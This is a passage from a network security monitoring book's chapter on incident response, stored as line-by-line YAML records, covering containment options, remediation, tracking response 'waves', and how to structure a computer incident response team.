- en: information by phone. If you suspect that an attacker has penetrated
  prefs: []
  type: TYPE_NORMAL
- en: your Voice over IP Protocol (VoIP) network, use cell phones. The same
  prefs: []
  type: TYPE_NORMAL
- en: goes for corporate-hosted real-time chat systems and other collaboration
  prefs: []
  type: TYPE_NORMAL
- en: platforms.
  prefs: []
  type: TYPE_NORMAL
- en: Many compromised organizations choose to communicate via email
  prefs: []
  type: TYPE_NORMAL
- en: using something like Gmail or another provider in order to avoid their
  prefs: []
  type: TYPE_NORMAL
- en: compromised systems. Stress-test these response activities before detecting
  prefs: []
  type: TYPE_NORMAL
- en: a serious incident.
  prefs: []
  type: TYPE_NORMAL
- en: Now that the CIRT and constituents are communicating about an inci-
  prefs: []
  type: TYPE_NORMAL
- en: dent, the final phase turns to doing something to mitigate the risk of loss.
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **197**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Resolution***'
  prefs: []
  type: TYPE_NORMAL
- en: Resolution refers to the process CIRTs and constituents use to transition
  prefs: []
  type: TYPE_NORMAL
- en: compromised systems from an at-risk state to a trustworthy state. The actual
  prefs: []
  type: TYPE_NORMAL
- en: transition process takes many forms, depending on the nature of the inci-
  prefs: []
  type: TYPE_NORMAL
- en: dent, as well as the capabilities and risk tolerance of the CIRT and constitu-
  prefs: []
  type: TYPE_NORMAL
- en: ents. Each party must balance the risk of data loss, alteration, or denial
  prefs: []
  type: TYPE_NORMAL
- en: of service against the business requirement of the compromised assets.
  prefs: []
  type: TYPE_NORMAL
- en: Frequently, the CIRT will want the compromised computer off the network
  prefs: []
  type: TYPE_NORMAL
- en: as quickly as possible, while the business owner will want it online no matter
  prefs: []
  type: TYPE_NORMAL
- en: what the cost.
  prefs: []
  type: TYPE_NORMAL
- en: When resolving incidents, consider establishing *risk-mitigation guidelines*.
  prefs: []
  type: TYPE_NORMAL
- en: When any asset is compromised, the constituent must take at least one mea-
  prefs: []
  type: TYPE_NORMAL
- en: sure to reduce risk of data loss, alteration, or denial of service, depending
  prefs: []
  type: TYPE_NORMAL
- en: on the nature of the incident. Taking no action is not an option. Tolerating
  prefs: []
  type: TYPE_NORMAL
- en: an intruder on the network is at best poor practice and at worst an invita-
  prefs: []
  type: TYPE_NORMAL
- en: tion for a lawsuit or other penalty.
  prefs: []
  type: TYPE_NORMAL
- en: '**Containment techniques**'
  prefs: []
  type: TYPE_NORMAL
- en: The CIRT and constituents should devise a hierarchy of possible risk-
  prefs: []
  type: TYPE_NORMAL
- en: mitigation tactics. These response options focus on containing intruders
  prefs: []
  type: TYPE_NORMAL
- en: and limiting their freedom to interact with victim computers, or pivot from
  prefs: []
  type: TYPE_NORMAL
- en: a victim computer to yet another victim.
  prefs: []
  type: TYPE_NORMAL
- en: When containing an intruder, begin with the victimized computer and
  prefs: []
  type: TYPE_NORMAL
- en: 'consider the following possibilities:'
  prefs: []
  type: TYPE_NORMAL
- en: • Put the computer in hibernate mode. (Don’t turn it off; you will lose
  prefs: []
  type: TYPE_NORMAL
- en: valuable volatile data in memory.)
  prefs: []
  type: TYPE_NORMAL
- en: • Shut down the port the computer uses to accesses the network.
  prefs: []
  type: TYPE_NORMAL
- en: • Implement a local firewall rule or kernel-level filter to deny the com-
  prefs: []
  type: TYPE_NORMAL
- en: puter the ability to communicate with other computers.
  prefs: []
  type: TYPE_NORMAL
- en: • Implement an access control list entry to prevent the computer from
  prefs: []
  type: TYPE_NORMAL
- en: communicating with other computers.
  prefs: []
  type: TYPE_NORMAL
- en: • Implement a routing change to prevent the computer from communi-
  prefs: []
  type: TYPE_NORMAL
- en: cating with other computers.
  prefs: []
  type: TYPE_NORMAL
- en: • Implement a firewall or proxy block to deny the computer access to the
  prefs: []
  type: TYPE_NORMAL
- en: Internet, which will cut off remote command-and-control channels.
  prefs: []
  type: TYPE_NORMAL
- en: More advanced CIRTs will have other tricks up their sleeves, such as
  prefs: []
  type: TYPE_NORMAL
- en: transitioning the intruder to a honey network of simulated computers for
  prefs: []
  type: TYPE_NORMAL
- en: study in a “safe” environment. (A honey network is a collection of computers
  prefs: []
  type: TYPE_NORMAL
- en: deployed by a CIRT to entice, trap, and observe intruders.) Whatever the
  prefs: []
  type: TYPE_NORMAL
- en: choice of action, key to this process is ensuring that the CIRT and constitu-
  prefs: []
  type: TYPE_NORMAL
- en: ent take some action to reduce risk of loss.
  prefs: []
  type: TYPE_NORMAL
- en: '**198** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Speed of Containment**'
  prefs: []
  type: TYPE_NORMAL
- en: The speed with which a CIRT and constituent take containment actions is
  prefs: []
  type: TYPE_NORMAL
- en: the subject of hot debate in the security world. Some argue for fast contain-
  prefs: []
  type: TYPE_NORMAL
- en: ment in order to limit risk; others argue for slower containment, providing
  prefs: []
  type: TYPE_NORMAL
- en: more time to learn about an adversary. The best answer is to contain inci-
  prefs: []
  type: TYPE_NORMAL
- en: dents as quickly as possible, as long as the CIRT can scope the incident to
  prefs: []
  type: TYPE_NORMAL
- en: the best of its capability.
  prefs: []
  type: TYPE_NORMAL
- en: '*Scoping the incident* means understanding the intruder’s reach. Is he lim-'
  prefs: []
  type: TYPE_NORMAL
- en: ited to interacting with only the one computer identified thus far? Does he
  prefs: []
  type: TYPE_NORMAL
- en: control more computers, or even the entire network by virtue of exploita-
  prefs: []
  type: TYPE_NORMAL
- en: tion of the Active Directory domain controllers?
  prefs: []
  type: TYPE_NORMAL
- en: The speed with which a CIRT can make the containment decision is one
  prefs: []
  type: TYPE_NORMAL
- en: of the primary ways to measure its maturity. If the CIRT regularly learns of
  prefs: []
  type: TYPE_NORMAL
- en: the presence of advanced (or even routine) threats via notification by exter-
  prefs: []
  type: TYPE_NORMAL
- en: nal parties, then rapid containment is less likely to be effective. A CIRT that
  prefs: []
  type: TYPE_NORMAL
- en: cannot find intrusions within its own environment is not likely to be able to
  prefs: []
  type: TYPE_NORMAL
- en: rapidly scope an incident. “Pulling the plug” on the first identified victim
    will
  prefs: []
  type: TYPE_NORMAL
- en: probably leave dozens, hundreds, or thousands of other victims online and
  prefs: []
  type: TYPE_NORMAL
- en: available to the adversary.
  prefs: []
  type: TYPE_NORMAL
- en: On the other hand, if the CIRT develops its own threat intelligence,
  prefs: []
  type: TYPE_NORMAL
- en: maintains pervasive visibility, and quickly finds intruders on its own, it is
  prefs: []
  type: TYPE_NORMAL
- en: more likely to be able to scope an incident in a minimum amount of time.
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs with that sort of capability should establish the intruder’s reach as
  prefs: []
  type: TYPE_NORMAL
- en: rapidly as possible, and then just as quickly contain the victim(s) to limit
  prefs: []
  type: TYPE_NORMAL
- en: the adversary’s options.
  prefs: []
  type: TYPE_NORMAL
- en: Deciding which containment action to take can be tricky. One way to
  prefs: []
  type: TYPE_NORMAL
- en: decide is to adopt either a threat-centric or an asset-centric approach to
  prefs: []
  type: TYPE_NORMAL
- en: defending information resources.
  prefs: []
  type: TYPE_NORMAL
- en: A *threat-centric* approach focuses on the presumed nature of the adver-
  prefs: []
  type: TYPE_NORMAL
- en: sary. A mature CIRT will likely track many distinct threat groups, and rec-
  prefs: []
  type: TYPE_NORMAL
- en: ognize when a more sophisticated or damaging threat compromises one
  prefs: []
  type: TYPE_NORMAL
- en: or more computers. When the CIRT detects that a threat group is active in
  prefs: []
  type: TYPE_NORMAL
- en: the environment, the CIRT will likely act quickly to contain the adversary.
  prefs: []
  type: TYPE_NORMAL
- en: If the CIRT instead notices a more routine event involving a criminal actor,
  prefs: []
  type: TYPE_NORMAL
- en: the CIRT may take a more leisurely response.
  prefs: []
  type: TYPE_NORMAL
- en: An *asset-centric* approach focuses on the presumed nature of the victim
  prefs: []
  type: TYPE_NORMAL
- en: computer. A CIRT working with a mature IT and business organization
  prefs: []
  type: TYPE_NORMAL
- en: will understand the sensitivity of the data on its networks and the roles of
  prefs: []
  type: TYPE_NORMAL
- en: systems processing that data. When the CIRT detects an incident affecting
  prefs: []
  type: TYPE_NORMAL
- en: a business-essential asset, the CIRT acts quickly. If the CIRT instead notices
  prefs: []
  type: TYPE_NORMAL
- en: activity affecting a less important asset, such as an employee laptop, the
  prefs: []
  type: TYPE_NORMAL
- en: CIRT acts less quickly. Some CIRTs take a hybrid approach, weighing the
  prefs: []
  type: TYPE_NORMAL
- en: relative nature of the threat actor and the affected asset.
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs should document their processes in *playbooks* that outline the
  prefs: []
  type: TYPE_NORMAL
- en: responsibilities and actions to be taken by CIRTs and constituents. CIRTs
  prefs: []
  type: TYPE_NORMAL
- en: should also track intruder activity differently, depending on the nature of
  prefs: []
  type: TYPE_NORMAL
- en: the threat. For example, mature CIRTs opposing the APT and aggressive
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **199**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**how To Tr ack waveS aND caMPaigNS**'
  prefs: []
  type: TYPE_NORMAL
- en: Although CIRTs should assign numbers of some sort to incidents (such as
  prefs: []
  type: TYPE_NORMAL
- en: 201305180006, for the sixth incident on the 18th of May, 2013), I recommend
  prefs: []
  type: TYPE_NORMAL
- en: that CIRTs devise names to refer to waves . Names are easier to remember than
  prefs: []
  type: TYPE_NORMAL
- en: numbers, and using them makes it easier for CIRTs to discuss serious activities
  prefs: []
  type: TYPE_NORMAL
- en: with constituents . Some CIRTs use the names assigned by the National Weather
  prefs: []
  type: TYPE_NORMAL
- en: Service’s National Hurricane Center ( *ht p://www.nhc.noaa.gov/aboutnames*
  prefs: []
  type: TYPE_NORMAL
- en: '*.shtml*) for a year’s worth of wave names . For example, the first wave of
    2013'
  prefs: []
  type: TYPE_NORMAL
- en: initiated by a CIRT to counter advanced threat activity would be named Wave
  prefs: []
  type: TYPE_NORMAL
- en: Andrea, the second would be Wave Barry, and so on .
  prefs: []
  type: TYPE_NORMAL
- en: It is crucial to recognize that, in the heat of an intrusion, CIRTs lack the
  prefs: []
  type: TYPE_NORMAL
- en: ability to ful y identify adversary activity . It does not make sense to assign
    a
  prefs: []
  type: TYPE_NORMAL
- en: campaign to adversary activity in the heat of battle . Rather, organize accord-
  prefs: []
  type: TYPE_NORMAL
- en: ing to how the CIRT is responding . Outside the digital melee of the ongoing
  prefs: []
  type: TYPE_NORMAL
- en: response activities, the CIRT’s intel igence team can perform analysis to deter-
  prefs: []
  type: TYPE_NORMAL
- en: mine how observed adversary actions fit into the overall picture .
  prefs: []
  type: TYPE_NORMAL
- en: Mature CIRTs track numerous threat groups, such as nation-state, criminal,
  prefs: []
  type: TYPE_NORMAL
- en: and hacktivist actors . CIRT intel igence teams will assign adversary activity
    to
  prefs: []
  type: TYPE_NORMAL
- en: these threat groups, pairing the CIRT’s wave response with the threat group
    in
  prefs: []
  type: TYPE_NORMAL
- en: question . For example, the intel igence team may realize that Wave Andrea
  prefs: []
  type: TYPE_NORMAL
- en: was the CIRT’s response to APT12, while Wave Barry was the CIRT’s response
  prefs: []
  type: TYPE_NORMAL
- en: to APT1 .
  prefs: []
  type: TYPE_NORMAL
- en: criminal groups often talk in terms of adversary *campaigns*. A campaign
  prefs: []
  type: TYPE_NORMAL
- en: is a long-term operation conducted by an adversary, usually to steal infor-
  prefs: []
  type: TYPE_NORMAL
- en: mation. A single intrusion is likely to be just one piece of an adversary’s
  prefs: []
  type: TYPE_NORMAL
- en: campaign.
  prefs: []
  type: TYPE_NORMAL
- en: CIRTs fighting persistent foes tend to organize their response actions
  prefs: []
  type: TYPE_NORMAL
- en: as *waves.* A wave does not exactly correspond to a campaign. Whereas a
  prefs: []
  type: TYPE_NORMAL
- en: campaign refers to the totality of an intruder’s prolonged attack against
  prefs: []
  type: TYPE_NORMAL
- en: a target, a wave refers to the CIRT’s efforts to detect and respond to the
  prefs: []
  type: TYPE_NORMAL
- en: adversary. In other words, intruders conduct campaigns, and CIRTs defend
  prefs: []
  type: TYPE_NORMAL
- en: in waves. CIRTs will never have perfect visibility into adversary activity.
  prefs: []
  type: TYPE_NORMAL
- en: Therefore, track what you *think* the adversary is doing (for example, a cam-
  prefs: []
  type: TYPE_NORMAL
- en: paign), as well as what the CIRT *is* doing (for example, a wave).
  prefs: []
  type: TYPE_NORMAL
- en: Mature CIRTs, upon recognizing that they need to respond to a serious
  prefs: []
  type: TYPE_NORMAL
- en: incident, are likely to take the following steps.
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Select a wave name and declare the wave open.
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Create a telephone bridge and password-protected real-time chatroom
  prefs: []
  type: TYPE_NORMAL
- en: to discuss activities to counter the adversary.
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Send an urgent notice to affected constituents letting them know that
  prefs: []
  type: TYPE_NORMAL
- en: the CIRT has opened a wave and how to communicate with the CIRT
  prefs: []
  type: TYPE_NORMAL
- en: via the telephone and chatroom.
  prefs: []
  type: TYPE_NORMAL
- en: '**200** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 4\. Collect and analyze additional evidence as necessary to scope the incident.
  prefs: []
  type: TYPE_NORMAL
- en: 5\. Escalate rapid incident reporting to constituents via real-time and digi-
  prefs: []
  type: TYPE_NORMAL
- en: tal means, identifying victim systems and data.
  prefs: []
  type: TYPE_NORMAL
- en: 6\. Coordinate a containment action with the constituents to limit the risk
  prefs: []
  type: TYPE_NORMAL
- en: of data loss, alteration, or denial of service.
  prefs: []
  type: TYPE_NORMAL
- en: 7\. Once containment for all victims is in place, declare the wave closed.
  prefs: []
  type: TYPE_NORMAL
- en: 8\. Throughout the duration of the wave, communicate regularly with con-
  prefs: []
  type: TYPE_NORMAL
- en: stituents to keep them informed and to reduce tension.
  prefs: []
  type: TYPE_NORMAL
- en: For less serious events, CIRTs do not need to employ such elaborate
  prefs: []
  type: TYPE_NORMAL
- en: communication methods. CIRTs will concentrate on documenting the
  prefs: []
  type: TYPE_NORMAL
- en: incident in an efficient manner and notifying the constituent within the
  prefs: []
  type: TYPE_NORMAL
- en: expected service time windows. For both types of events, CIRTs should mea-
  prefs: []
  type: TYPE_NORMAL
- en: sure times of key steps in the detection and response process. For example,
  prefs: []
  type: TYPE_NORMAL
- en: the text at the bottom of Figure 9-2 (which illustrates the elements of the
  prefs: []
  type: TYPE_NORMAL
- en: NSM process) depicts points during the incident detection and response
  prefs: []
  type: TYPE_NORMAL
- en: subprocesses when time should be recorded. Figure 9-6 reproduces those
  prefs: []
  type: TYPE_NORMAL
- en: key moments.
  prefs: []
  type: TYPE_NORMAL
- en: Request more data
  prefs: []
  type: TYPE_NORMAL
- en: Event observed/stored
  prefs: []
  type: TYPE_NORMAL
- en: Identification
  prefs: []
  type: TYPE_NORMAL
- en: Validation
  prefs: []
  type: TYPE_NORMAL
- en: Documentation
  prefs: []
  type: TYPE_NORMAL
- en: Notification
  prefs: []
  type: TYPE_NORMAL
- en: Acknowledgment
  prefs: []
  type: TYPE_NORMAL
- en: Containment
  prefs: []
  type: TYPE_NORMAL
- en: Remediation
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-6: Events for which time should be recorded*'
  prefs: []
  type: TYPE_NORMAL
- en: So far, we’ve focused on containment, or countermeasures, designed
  prefs: []
  type: TYPE_NORMAL
- en: to limit risk, but containment alone still leaves the victim computer com-
  prefs: []
  type: TYPE_NORMAL
- en: promised. Once an attack has been contained, it’s time for *remediation,* or
  prefs: []
  type: TYPE_NORMAL
- en: restoring the compromised asset to a trustworthy state.
  prefs: []
  type: TYPE_NORMAL
- en: '**remediation**'
  prefs: []
  type: TYPE_NORMAL
- en: Remediation is another hot topic in the security industry. Some argue that
  prefs: []
  type: TYPE_NORMAL
- en: systems can be “cleaned” to remove the intruder’s tools, persistence mecha-
  prefs: []
  type: TYPE_NORMAL
- en: nisms, and access methods. Others say victim computers should be rebuilt
  prefs: []
  type: TYPE_NORMAL
- en: from installation media or trustworthy backups. A few even say compromised
  prefs: []
  type: TYPE_NORMAL
- en: systems should be reflashed or abandoned, because advanced intruders can
  prefs: []
  type: TYPE_NORMAL
- en: implant persistence mechanisms in hardware!
  prefs: []
  type: TYPE_NORMAL
- en: You should rebuild any system with which an adversary was known
  prefs: []
  type: TYPE_NORMAL
- en: to interact, but only after fully scoping the incident. Here, *interact* means
  prefs: []
  type: TYPE_NORMAL
- en: there is a forensic reason to assume the adversary acquired and utilized
  prefs: []
  type: TYPE_NORMAL
- en: unauthorized access to a victim. It does not mean the intruder *could* have
  prefs: []
  type: TYPE_NORMAL
- en: accessed the victim, but did not. The fact of that matter is that it is virtu-
  prefs: []
  type: TYPE_NORMAL
- en: ally impossible for a CIRT to know all the actions an intruder took on any
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **201**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: victim. Usually, a CIRT sees only the proverbial “tip of the iceberg.” After
    all, why jeopardize a remediation plan by trying to “clean” a victim, only to
  prefs: []
  type: TYPE_NORMAL
- en: learn that disinfection failed to remove a persistence mechanism?
  prefs: []
  type: TYPE_NORMAL
- en: How fast should you remediate? Some CIRTs strive to limit the time
  prefs: []
  type: TYPE_NORMAL
- en: from *detection to containment* to one hour or less. Others are more aggressive
    (and ambitious) and strive to limit the time from *adversary access to remediation*
    to one hour or less. The choice depends on the risk tolerance of your
  prefs: []
  type: TYPE_NORMAL
- en: organization and the capabilities of the CIRT, IT teams, and constituents.
  prefs: []
  type: TYPE_NORMAL
- en: Once you start tracking times from detection to containment, you may find
  prefs: []
  type: TYPE_NORMAL
- en: that containment takes weeks, not an hour. Record these metrics and try to
  prefs: []
  type: TYPE_NORMAL
- en: drive down the time as you continue to develop your process and tactics.
  prefs: []
  type: TYPE_NORMAL
- en: '***Using NSM to Improve Security***'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we have a framework to think about CIRT and security improve-
  prefs: []
  type: TYPE_NORMAL
- en: ment. Let’s look at a few examples of how it could work in practice.
  prefs: []
  type: TYPE_NORMAL
- en: • A vendor proposes adding a probe to collect and interpret NetFlow
  prefs: []
  type: TYPE_NORMAL
- en: records (a type of session data) from border routers. This activity
  prefs: []
  type: TYPE_NORMAL
- en: belongs in the collection phase of the NSM process. Because the CIRT
  prefs: []
  type: TYPE_NORMAL
- en: already gathers session data using Argus and Bro on SO sensors that
  prefs: []
  type: TYPE_NORMAL
- en: are watching gateways, additional collection may not be necessary. The
  prefs: []
  type: TYPE_NORMAL
- en: CIRT rejects the offer to buy NetFlow processing equipment.
  prefs: []
  type: TYPE_NORMAL
- en: • Mandiant releases its report on APT1 ( *http://www.mandiant.com/apt1/*).
  prefs: []
  type: TYPE_NORMAL
- en: The archive includes more than 3,000 indicators. The CIRT realizes it
  prefs: []
  type: TYPE_NORMAL
- en: can use the indicators for IOC-centric matching activities, part of the
  prefs: []
  type: TYPE_NORMAL
- en: analysis phase in the NSM process. Mandiant also releases over 100 pages
  prefs: []
  type: TYPE_NORMAL
- en: describing tools used by APT1 actors. The CIRT uses that information
  prefs: []
  type: TYPE_NORMAL
- en: for IOC-free hunting analysis.
  prefs: []
  type: TYPE_NORMAL
- en: • The time elapsed from incident detection to containment at a particu-
  prefs: []
  type: TYPE_NORMAL
- en: lar company is on the order of weeks, and the CIO wants to decrease
  prefs: []
  type: TYPE_NORMAL
- en: this to under one hour. A vendor proposes a new asset management
  prefs: []
  type: TYPE_NORMAL
- en: system. Multiple business lines express enthusiasm for the new tool
  prefs: []
  type: TYPE_NORMAL
- en: and form a working group to better manage asset inventory. The CIRT
  prefs: []
  type: TYPE_NORMAL
- en: endorses this new system because it will decrease the time needed to
  prefs: []
  type: TYPE_NORMAL
- en: identify asset owners and will improve the accuracy of incident notifica-
  prefs: []
  type: TYPE_NORMAL
- en: tion during the escalation phase of the NSM process.
  prefs: []
  type: TYPE_NORMAL
- en: • The networking team decides to try implementing a network access
  prefs: []
  type: TYPE_NORMAL
- en: control (NAC) solution. The IT team members resist the program
  prefs: []
  type: TYPE_NORMAL
- en: because they fear it will impede user productivity, but the CIRT thinks
  prefs: []
  type: TYPE_NORMAL
- en: that this solution could be helpful during the resolution phase of the
  prefs: []
  type: TYPE_NORMAL
- en: NSM process. The CIRT convinces the IT team to support the NAC
  prefs: []
  type: TYPE_NORMAL
- en: solution.
  prefs: []
  type: TYPE_NORMAL
- en: '**202** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: These examples demonstrate how working within the NSM process
  prefs: []
  type: TYPE_NORMAL
- en: can help CIRTs make better decisions regarding their operations. Rather
  prefs: []
  type: TYPE_NORMAL
- en: than being led by the newest security fad or vendor tool, CIRTs can identify
  prefs: []
  type: TYPE_NORMAL
- en: deficiencies in and improve all phases of their NSM process. By addressing
  prefs: []
  type: TYPE_NORMAL
- en: existing gaps, the CIRT can reduce detection and response time and help
  prefs: []
  type: TYPE_NORMAL
- en: identify problems in systems that are leading to compromise.
  prefs: []
  type: TYPE_NORMAL
- en: '***Building a CIRT***'
  prefs: []
  type: TYPE_NORMAL
- en: This book is primarily for those practicing NSM as individuals or as mem-
  prefs: []
  type: TYPE_NORMAL
- en: bers of CIRTs. Those of you working as lone contributors may wish your
  prefs: []
  type: TYPE_NORMAL
- en: constituent to expand the resources for handling NSM duties. To help jus-
  prefs: []
  type: TYPE_NORMAL
- en: 'tify additions, track these key metrics:'
  prefs: []
  type: TYPE_NORMAL
- en: • The classification and count of incidents
  prefs: []
  type: TYPE_NORMAL
- en: • The time elapsed from incident detection to containment
  prefs: []
  type: TYPE_NORMAL
- en: Take these metrics to management staff members and ask if they are
  prefs: []
  type: TYPE_NORMAL
- en: satisfied with their numbers. Are they happy with the type and number of
  prefs: []
  type: TYPE_NORMAL
- en: incidents per quarter and year? Are they content with the amount of time it
  prefs: []
  type: TYPE_NORMAL
- en: takes to progress from incident detection to containment? If the answer is
  prefs: []
  type: TYPE_NORMAL
- en: no, estimate the cost of adding manpower, new tools, and better processes.
  prefs: []
  type: TYPE_NORMAL
- en: That’s your justification for adding new CIRT capabilities, or even creat-
  prefs: []
  type: TYPE_NORMAL
- en: ing the organization’s first CIRT. (For more reasons to build a CIRT and
  prefs: []
  type: TYPE_NORMAL
- en: related counter-threat operations, see my article “Become a Hunter” in the
  prefs: []
  type: TYPE_NORMAL
- en: July–August 2011 issue of *Information Security Magazine* at [*http://taosecurity*](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
  prefs: []
  type: TYPE_NORMAL
- en: '[*.blogspot.com/2011/12/become-hunter.html*.](http://taosecurity.blogspot.com/2011/12/become-hunter.html)
    ) Once you’ve been given the approval to add CIRT capacity, the next decision
    is how to build a team. I recommend'
  prefs: []
  type: TYPE_NORMAL
- en: the general functions shown in Figure 9-7\.
  prefs: []
  type: TYPE_NORMAL
- en: Director of Incident Response
  prefs: []
  type: TYPE_NORMAL
- en: Incident Detection and
  prefs: []
  type: TYPE_NORMAL
- en: Applied Threat
  prefs: []
  type: TYPE_NORMAL
- en: Infrastructure and
  prefs: []
  type: TYPE_NORMAL
- en: Response
  prefs: []
  type: TYPE_NORMAL
- en: Intelligence
  prefs: []
  type: TYPE_NORMAL
- en: Development
  prefs: []
  type: TYPE_NORMAL
- en: Incident Handlers
  prefs: []
  type: TYPE_NORMAL
- en: Principal Analysts
  prefs: []
  type: TYPE_NORMAL
- en: Architects
  prefs: []
  type: TYPE_NORMAL
- en: Incident Analysts
  prefs: []
  type: TYPE_NORMAL
- en: Senior Analysts
  prefs: []
  type: TYPE_NORMAL
- en: Engineers
  prefs: []
  type: TYPE_NORMAL
- en: Event Analysts
  prefs: []
  type: TYPE_NORMAL
- en: Associate Analysts
  prefs: []
  type: TYPE_NORMAL
- en: Administrators
  prefs: []
  type: TYPE_NORMAL
- en: Constituent Relations Team
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-7: General CIRT structure*'
  prefs: []
  type: TYPE_NORMAL
- en: NSM Operations **203**
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'The CIRT structure includes the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Director of Incident Response**'
  prefs: []
  type: TYPE_NORMAL
- en: The director organizes, trains, and equips the CIRT to succeed. The
  prefs: []
  type: TYPE_NORMAL
- en: director selects a deputy from one of the three CIRT components to
  prefs: []
  type: TYPE_NORMAL
- en: assist with this mission, and keeps management away from the CIRT
  prefs: []
  type: TYPE_NORMAL
- en: so the CIRT can do its job.
  prefs: []
  type: TYPE_NORMAL
- en: '**Incident Detection and Response (IDR) Center**'
  prefs: []
  type: TYPE_NORMAL
- en: This group is responsible for the daily analysis and escalation of secu-
  prefs: []
  type: TYPE_NORMAL
- en: rity incidents. The IDR Center consists of incident handlers (IHs, expe-
  prefs: []
  type: TYPE_NORMAL
- en: rienced analysts tasked with hunting), incident analysts (IAs, mid-level
  prefs: []
  type: TYPE_NORMAL
- en: analysts who combine hunting with matching), and event analysts (EAs,
  prefs: []
  type: TYPE_NORMAL
- en: beginning analysts who focus on matching). Analysts at all levels have
  prefs: []
  type: TYPE_NORMAL
- en: access to all datatypes, but EAs and IAs may classify only events for which
  prefs: []
  type: TYPE_NORMAL
- en: they are responsible. IHs train IAs and EAs, take them on digital hunt-
  prefs: []
  type: TYPE_NORMAL
- en: ing trips, and operationalize lessons into the repeatable playbooks EAs
  prefs: []
  type: TYPE_NORMAL
- en: use to identify intrusions. IHs open, manage, and close waves, depend-
  prefs: []
  type: TYPE_NORMAL
- en: ing on IAs and EAs for support. If possible, the IDR Center works a
  prefs: []
  type: TYPE_NORMAL
- en: 24×7 schedule, with at least EAs on 24×7 duty and IHs and IAs on call.
  prefs: []
  type: TYPE_NORMAL
- en: '**Applied Threat Intelligence (ATI) Center**'
  prefs: []
  type: TYPE_NORMAL
- en: This group is responsible for digital intelligence activities, internal
  prefs: []
  type: TYPE_NORMAL
- en: security consulting, adversary simulation, red teaming, and penetration
  prefs: []
  type: TYPE_NORMAL
- en: 'testing. It includes the following teams:'
  prefs: []
  type: TYPE_NORMAL
- en: • An *Intelligence Team* provides reporting support during waves and
  prefs: []
  type: TYPE_NORMAL
- en: regular briefings and updates on adversary activity to the CIRT and
  prefs: []
  type: TYPE_NORMAL
- en: constituents. The team members also search evidence for indicators
  prefs: []
  type: TYPE_NORMAL
- en: of compromise and analyze it to extract adversary tools, techniques,
  prefs: []
  type: TYPE_NORMAL
- en: and procedures.
  prefs: []
  type: TYPE_NORMAL
- en: • The *Red Team* proactively assesses and tests the organization to
  prefs: []
  type: TYPE_NORMAL
- en: determine its security posture by simulating a wide variety of
  prefs: []
  type: TYPE_NORMAL
- en: threats. This team provides a metric against which CIRT perfor-
  prefs: []
  type: TYPE_NORMAL
- en: mance can be measured.
  prefs: []
  type: TYPE_NORMAL
- en: • The *Blue Team* members act as internal security consultants. They
  prefs: []
  type: TYPE_NORMAL
- en: help the organization improve the security of their assets.
  prefs: []
  type: TYPE_NORMAL
- en: '**Infrastructure and Development (ID) Center**'
  prefs: []
  type: TYPE_NORMAL
- en: This group enables the other two CIRT components by employing soft-
  prefs: []
  type: TYPE_NORMAL
- en: ware developers who code production-grade tools. It designs, builds,
  prefs: []
  type: TYPE_NORMAL
- en: deploys, and runs the collection, analysis, and escalation tools. It also
  prefs: []
  type: TYPE_NORMAL
- en: leads development of new detection and response techniques. While
  prefs: []
  type: TYPE_NORMAL
- en: the other teams may develop proof-of-concept tools to support their
  prefs: []
  type: TYPE_NORMAL
- en: missions, the ID Team eventually assumes responsibility for those tools.
  prefs: []
  type: TYPE_NORMAL
- en: '**204** Chapter 9'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Constituent Relations Team**'
  prefs: []
  type: TYPE_NORMAL
- en: This group acts as an intermediary between the CIRT and its constitu-
  prefs: []
  type: TYPE_NORMAL
- en: ents. These team members help keep things running smoothly between
  prefs: []
  type: TYPE_NORMAL
- en: CIRT and constituents, and they represent the CIRT outside the com-
  prefs: []
  type: TYPE_NORMAL
- en: pany itself.
  prefs: []
  type: TYPE_NORMAL
- en: '**conclusion**'
  prefs: []
  type: TYPE_NORMAL
- en: This chapter explained the enterprise security cycle consisting of planning,
  prefs: []
  type: TYPE_NORMAL
- en: resistance, detection, and response phases. Many organizations pour all
  prefs: []
  type: TYPE_NORMAL
- en: of their effort into planning and resistance, but invest next to nothing for
  prefs: []
  type: TYPE_NORMAL
- en: detection and response.
  prefs: []
  type: TYPE_NORMAL
- en: In recent years, as persistent intruders have sliced through routine
  prefs: []
  type: TYPE_NORMAL
- en: defenses, organizations have begun to realize the value of detection and
  prefs: []
  type: TYPE_NORMAL
- en: response. If adversaries lose access to an organization before they can accom-
  prefs: []
  type: TYPE_NORMAL
- en: plish their mission, then they lose. The CIRT wins every time it defeats an
  prefs: []
  type: TYPE_NORMAL
- en: adversary before he can steal, alter, or deny access to business information.
  prefs: []
  type: TYPE_NORMAL
- en: The NSM process of collection, analysis, escalation, and resolution is
  prefs: []
  type: TYPE_NORMAL
